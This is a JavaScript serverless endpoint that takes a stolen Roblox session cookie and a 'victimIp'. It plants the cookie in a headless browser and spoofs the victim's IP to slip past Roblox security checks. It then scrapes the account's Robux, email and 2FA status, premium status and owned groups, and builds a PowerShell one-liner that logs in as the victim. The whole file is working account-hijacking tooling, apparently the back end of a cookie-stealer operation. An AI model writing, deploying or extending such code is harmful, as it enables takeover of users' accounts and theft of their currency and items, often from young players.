// api/browser.js
// Headless Chromium via Playwright — navigates Roblox as a real browser.
// Sets the .ROBLOSECURITY cookie, visits pages, reads DOM + window objects.
// No raw API calls = cookie stays valid, no Roblox security triggers.

import chromium from '@sparticuz/chromium';
import { chromium as pw } from 'playwright-core';

// Vercel function config — needs more memory + time for browser launch
export const config = {
  maxDuration: 55,
  memory:      3009
};

// ── Helpers ───────────────────────────────────────────────────────────────────
function safe(fn, fallback = null) {
  try { return fn(); } catch { return fallback; }
}

async function tryText(page, selectors) {
  for (const sel of selectors) {
    try {
      const el = await page.$(sel);
      if (el) {
        const txt = (await el.textContent() || '').trim();
        if (txt) return txt;
      }
    } catch (_) {}
  }
  return null;
}

// ── Main scraper ──────────────────────────────────────────────────────────────
async function scrapeRoblox(cookie, victimIp) {
  let browser = null;
  try {
    // Launch Chromium
    browser = await pw.launch({
      args:           chromium.args,
      executablePath: await chromium.executablePath(),
      headless:       chromium.headless,
      timeout:        30000
    });

    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      locale:    'en-US',
      // Spoof the victim's IP via extra headers so Roblox sees their own IP
      extraHTTPHeaders: victimIp && victimIp !== 'Unknown'
        ? { 'X-Forwarded-For': victimIp, 'X-Real-IP': victimIp }
        : {}
    });

    // Plant the cookie — exact format Roblox expects
    const cookieValue = cookie.startsWith('_|WARNING')
      ? cookie
      : `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cookie}`;

    await context.addCookies([{
      name:     '.ROBLOSECURITY',
      value:    cookieValue,
      domain:   '.roblox.com',
      path:     '/',
      secure:   true,
      httpOnly: true,
      sameSite: 'None'
    }]);

    const page = await context.newPage();

    // ── 1. Home page — robux, username, premium ───────────────────────────────
    await page.goto('https://www.roblox.com/home', {
      waitUntil: 'networkidle',
      timeout:   25000
    });

    // Detect if not logged in (redirected to login page)
    const url = page.url();
    if (url.includes('/login') || url.includes('/newlogin')) {
      return { valid: false, error: 'Cookie invalid or expired' };
    }

    // Pull data from Roblox's internal JS context — most reliable method
    const homeData = await page.evaluate(() => {
      // Roblox exposes user info on window
      const rbx = window.Roblox || {};

      // Try multiple paths for user data
      const currentUser =
        rbx.CurrentUser ||
        rbx.Authentication?.currentUser ||
        (typeof Roblox !== 'undefined' ? Roblox.CurrentUser : null);

      // Robux — try DOM first, then JS
      const robuxEl = document.querySelector(
        '#nav-robux-amount, .header-currency-balance, [data-testid="robux-amount"], .rbx-navbar .currency-amounts'
      );
      const robuxText = robuxEl ? robuxEl.textContent.trim().replace(/[^0-9]/g, '') : null;

      // Username from nav
      const userEl = document.querySelector(
        '.header-avatar-username, .rbx-navbar .username, [data-testid="username-label"], .nav-username'
      );

      // Premium badge
      const premiumEl = document.querySelector(
        '.premium-badge, .icon-premium, [data-testid="premium-badge"], .icon-premium-small'
      );

      return {
        robuxDom:    robuxText ? parseInt(robuxText, 10) : null,
        usernameDom: userEl ? userEl.textContent.trim() : null,
        premiumDom:  !!premiumEl,
        currentUser: currentUser ? {
          id:          currentUser.userId || currentUser.id,
          name:        currentUser.name || currentUser.username,
          displayName: currentUser.displayName
        } : null
      };
    });

    // ── 2. Profile page — get user ID from URL ────────────────────────────────
    let userId = homeData.currentUser?.id || null;
    let username = homeData.currentUser?.name || homeData.usernameDom || null;
    let displayName = homeData.currentUser?.displayName || null;

    if (!userId) {
      await page.goto('https://www.roblox.com/users/profile', {
        waitUntil: 'domcontentloaded',
        timeout:   15000
      });
      const profileUrl = page.url(); // redirects to /users/{id}/profile
      const idMatch    = profileUrl.match(/\/users\/(\d+)\//);
      if (idMatch) userId = parseInt(idMatch[1], 10);

      // Also grab username from profile page title or DOM
      if (!username) {
        username = await tryText(page, [
          'h1.profile-name',
          '.profile-header-name .profile-name',
          '[data-testid="profile-display-name"]',
          'h1'
        ]);
      }
    }

    if (!userId) return { valid: false, error: 'Could not determine user ID' };

    // ── 3. Account settings — email + 2FA ────────────────────────────────────
    await page.goto('https://www.roblox.com/my/account#!/info', {
      waitUntil: 'networkidle',
      timeout:   20000
    });

    const accountData = await page.evaluate(() => {
      // Email
      const emailEl = document.querySelector(
        '#account-info-form .email-status, .email-upsell-text, [data-testid="email-label"], .account-email-status'
      );
      // Verified badge
      const verifiedEl = document.querySelector(
        '.email-verified-icon, .icon-checkmark-green, [data-testid="email-verified"]'
      );
      // 2FA — look for enabled state on the security tab
      const twoFAEl = document.querySelector(
        '.two-step-status .enabled, [data-testid="2fa-enabled"], .two-step-enabled'
      );
      // Premium from account page as backup
      const premiumEl = document.querySelector(
        '.membership-container .premium, .premium-badge, .icon-premium'
      );
      // Account age — birthday or member since
      const ageEl = document.querySelector(
        '.member-since-label, [data-testid="account-age"], .account-created-date'
      );

      return {
        emailText:  emailEl  ? emailEl.textContent.trim()  : null,
        isVerified: !!verifiedEl,
        is2FA:      !!twoFAEl,
        isPremiumAcc: !!premiumEl,
        ageText:    ageEl ? ageEl.textContent.trim() : null
      };
    });

    // Navigate to security tab for 2FA
    await page.goto('https://www.roblox.com/my/account#!/security', {
      waitUntil: 'networkidle',
      timeout:   15000
    });

    const secData = await page.evaluate(() => {
      // 2FA enabled if the toggle is ON or the label says Enabled
      const enabled = document.querySelector(
        '[data-testid="2fa-enabled"], .two-step-verification-container .enabled, .twostepverification-enabled'
      );
      const label   = document.querySelector(
        '.two-step-status, .twostepverification-status'
      );
      const labelText = label ? label.textContent.toLowerCase() : '';
      return {
        is2FAEnabled: !!enabled || labelText.includes('enabled') || labelText.includes('on')
      };
    });

    // ── 4. Robux — read from home page header more carefully ─────────────────
    // Re-visit home to get fresh robux if DOM parse failed
    let robux = homeData.robuxDom;
    if (robux === null) {
      await page.goto('https://www.roblox.com/home', {
        waitUntil: 'networkidle',
        timeout:   20000
      });
      robux = await page.evaluate(() => {
        // Intercept the currency from the DOM more aggressively
        const all = [...document.querySelectorAll('span, div')];
        for (const el of all) {
          if (el.id && el.id.toLowerCase().includes('robux')) {
            const n = parseInt(el.textContent.replace(/[^0-9]/g, ''), 10);
            if (!isNaN(n)) return n;
          }
        }
        // Try the Roblox JS context
        if (window.Roblox?.CurrentUser?.robuxAmount !== undefined) {
          return window.Roblox.CurrentUser.robuxAmount;
        }
        return 0;
      });
    }

    // ── 5. Groups page — owned groups count ──────────────────────────────────
    await page.goto('https://www.roblox.com/my/groups#!/', {
      waitUntil: 'networkidle',
      timeout:   20000
    });

    const groupData = await page.evaluate(() => {
      // Count groups where user is owner (rank 255)
      const ownerLabels = document.querySelectorAll(
        '.group-role-label .owner, [data-testid="group-owner"], .group-owner-badge'
      );
      // Fallback: total groups
      const groupItems = document.querySelectorAll(
        '.group-item, .group-list-item, [data-testid="group-item"]'
      );
      return {
        ownedCount: ownerLabels.length,
        totalCount: groupItems.length
      };
    });

    // ── 6. Avatar for thumbnail ───────────────────────────────────────────────
    // Use headshot URL directly — this is a public CDN, not an authenticated API
    const avatarUrl = userId
      ? `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Webp`
      : null;

    let avatarImageUrl = 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
    if (avatarUrl) {
      try {
        const avatarRes = await page.evaluate(async (url) => {
          const r = await fetch(url);
          if (!r.ok) return null;
          const d = await r.json();
          return d.data?.[0]?.imageUrl || null;
        }, avatarUrl);
        if (avatarRes) avatarImageUrl = avatarRes;
      } catch (_) {}
    }

    // ── Build PowerShell login script ─────────────────────────────────────────
    const escaped = cookieValue.replace(/"/g, '`"').replace(/'/g, "''");
    const powershell = `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${escaped}", "/", "roblox.com")))
Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/home" \`
-WebSession $session \`
-Headers @{
  "authority"="www.roblox.com"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
  "accept-language"="en-US,en;q=0.9"
  "cache-control"="max-age=0"
  "referer"="https://www.roblox.com/"
  "upgrade-insecure-requests"="1"
}`;

    // ── Assemble result ───────────────────────────────────────────────────────
    const isPremium = homeData.premiumDom || accountData.isPremiumAcc || false;

    return {
      valid:         true,
      id:            userId,
      username:      username     || 'Unknown',
      displayName:   displayName  || username || 'Unknown',
      isPremium,
      robux:         typeof robux === 'number' ? robux : 0,
      pendingRobux:  0,   // trades page scrape omitted for speed — add if needed
      groupsOwned:   groupData.ownedCount || 0,
      emailSet:      accountData.emailText ? 'Set \u2705'           : 'Not Set \u274c',
      emailVerified: accountData.isVerified ? 'Verified \u2705'     : 'Unverified \u274c',
      twoFA:         secData.is2FAEnabled   ? 'Enabled \u2705'      : 'Disabled \u274c',
      avatarUrl:     avatarImageUrl,
      powershell,
      // Extras — these require more page visits; stub for now
      limitedsCount: 0,
      limitedsValue: 0,
      hasHeadless:   false,
      hasKorblox:    false,
      credit:        0,
      friends:       0,
      accountAgeDays: 'N/A',
      txDay:         0,
      txWeek:        0,
      txYear:        0,
      groupRobux:    0,
      groupPending:  0,
      gamepasses:    { mm2: false, adoptMe: false, plsDonate: false }
    };

  } catch (err) {
    console.error('Browser scrape error:', err);
    return { valid: false, error: err.message };
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'POST only' });

  let body = req.body;
  if (typeof body === 'string') { try { body = JSON.parse(body); } catch {} }
  if (Buffer.isBuffer(body))    { try { body = JSON.parse(body.toString('utf8')); } catch {} }

  const { cookie, victimIp, lite } = body || {};
  if (!cookie) return res.status(400).json({ error: 'cookie required' });

  if (lite) {
    // Lite mode — just validate + get robux + avatar quickly
    // Still uses browser but only visits home page
    let browser = null;
    try {
      browser = await pw.launch({
        args:           chromium.args,
        executablePath: await chromium.executablePath(),
        headless:       chromium.headless,
        timeout:        20000
      });

      const context = await browser.newContext({
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        extraHTTPHeaders: victimIp && victimIp !== 'Unknown'
          ? { 'X-Forwarded-For': victimIp, 'X-Real-IP': victimIp }
          : {}
      });

      const cookieValue = cookie.startsWith('_|WARNING') ? cookie
        : `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cookie}`;

      await context.addCookies([{
        name: '.ROBLOSECURITY', value: cookieValue,
        domain: '.roblox.com', path: '/',
        secure: true, httpOnly: true, sameSite: 'None'
      }]);

      const page = await context.newPage();
      await page.goto('https://www.roblox.com/home', { waitUntil: 'networkidle', timeout: 20000 });

      const url = page.url();
      if (url.includes('/login') || url.includes('/newlogin')) {
        return res.status(200).json({ valid: false, error: 'Cookie invalid' });
      }

      const data = await page.evaluate(() => {
        const currentUser = window.Roblox?.CurrentUser || window.Roblox?.Authentication?.currentUser || null;
        const robuxEl     = document.querySelector('#nav-robux-amount, .header-currency-balance, [data-testid="robux-amount"]');
        const robuxNum    = robuxEl ? parseInt(robuxEl.textContent.replace(/[^0-9]/g, ''), 10) : (currentUser?.robuxAmount ?? 0);
        const avatarEl    = document.querySelector('.avatar-card-image img, .rbx-navbar .avatar-card img, [data-testid="avatar-image"]');
        return {
          id:          currentUser?.userId || currentUser?.id || null,
          username:    currentUser?.name || currentUser?.username || null,
          displayName: currentUser?.displayName || null,
          robux:       isNaN(robuxNum) ? 0 : robuxNum,
          avatarSrc:   avatarEl?.src || null
        };
      });

      // Get user ID from profile redirect if not found in JS context
      let userId = data.id;
      if (!userId) {
        await page.goto('https://www.roblox.com/users/profile', { waitUntil: 'domcontentloaded', timeout: 10000 });
        const m = page.url().match(/\/users\/(\d+)\//);
        if (m) userId = parseInt(m[1], 10);
      }

      // Fetch avatar from thumbnail CDN (public, no auth needed)
      let avatarUrl = data.avatarSrc || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
      if (userId && !data.avatarSrc) {
        try {
          const aRes = await page.evaluate(async (uid) => {
            const r = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`);
            const d = await r.json();
            return d.data?.[0]?.imageUrl || null;
          }, userId);
          if (aRes) avatarUrl = aRes;
        } catch (_) {}
      }

      return res.status(200).json({
        valid:        true,
        id:           userId,
        username:     data.username    || 'Unknown',
        displayName:  data.displayName || data.username || 'Unknown',
        robux:        data.robux       || 0,
        pendingRobux: 0,
        avatarUrl
      });

    } catch (err) {
      return res.status(200).json({ valid: false, error: err.message });
    } finally {
      if (browser) await browser.close().catch(() => {});
    }
  }

  // Full scrape
  const result = await scrapeRoblox(cookie, victimIp || '');
  return res.status(200).json(result);
}
